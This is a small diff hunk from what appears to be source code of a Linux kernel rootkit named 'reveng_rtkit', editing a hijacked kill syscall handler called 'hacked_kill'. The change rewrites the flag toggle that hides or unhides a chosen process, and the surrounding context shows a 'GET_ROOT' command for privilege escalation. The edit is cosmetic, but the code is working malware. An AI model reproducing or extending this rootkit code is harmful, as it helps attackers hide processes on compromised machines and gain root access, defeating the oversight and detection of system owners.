@@ -287,7 +287,9 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 		case HIDE_UNHIDE_PROCESS:
 			if ((task = find_task(pid)) == NULL)
 				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
+
+			// XOR operation is used to hide and unhide process
+			task->flags = task->flags ^ PF_INVISIBLE;
 			printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
 			break;
 		case GET_ROOT:
